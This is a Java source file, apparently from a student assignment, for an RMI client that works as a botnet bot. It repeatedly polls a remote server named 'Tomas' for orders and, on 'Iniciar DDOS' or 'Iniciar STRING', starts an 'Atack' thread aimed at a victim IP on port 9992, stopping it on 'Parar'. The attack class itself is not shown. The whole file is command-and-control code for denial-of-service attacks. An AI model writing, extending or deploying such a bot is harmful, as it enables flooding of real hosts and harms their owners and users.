

import java.rmi.AccessException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;



public class RMIClient {

	/**
	 * @param args
	 * @throws NotBoundException 
	 * @throws RemoteException 
	 * @throws AccessException 
	 * @throws InterruptedException 
	 */
	public static void main(String[] args) throws AccessException, RemoteException, NotBoundException, InterruptedException {
		 System.setProperty("java.security.policy", "file:/C:/Users/Backup_LABS/workspace/Trabajo_Avanzada/src/java.policy" );
		 													 

		if (System.getSecurityManager() == null) { 
			System.setSecurityManager(new SecurityManager()); 
		} 

		Registry reg = LocateRegistry.getRegistry("localhost", 5555);
		RMIServerI server = (RMIServerI) reg.lookup("Tomas");
		server.imprimir("Hola soy el cliente Como te va");
		Thread hilo = null;
		AccionCliente x;
		String opcion = "";
		
		System.out.println(server.getDatos());
		
		
		while (true)
		{
			x = server.getOrden();
			
			if(x.getMensaje().compareTo("Iniciar DDOS") == 0 && opcion != x.getMensaje())
			{
				opcion = x.getMensaje();
				if(hilo != null) hilo.stop();
				hilo = (new Thread(new Atack(x.getIpVictima(),9992)));
				hilo.start();
			}
			if(x.getMensaje().compareTo("Iniciar STRING") == 0 && opcion != x.getMensaje())
			{
				opcion = x.getMensaje();
				if(hilo != null) hilo.stop();
				hilo = (new Thread(new Atack(x.getIpVictima(), 9992,x.getStrArbitrario())));
				hilo.start();
			}
			if(x.getMensaje()=="Parar" && opcion != x.getMensaje())
			{
				opcion = x.getMensaje();
				hilo.stop();
			}
				
		
			
		}

	}
	

}
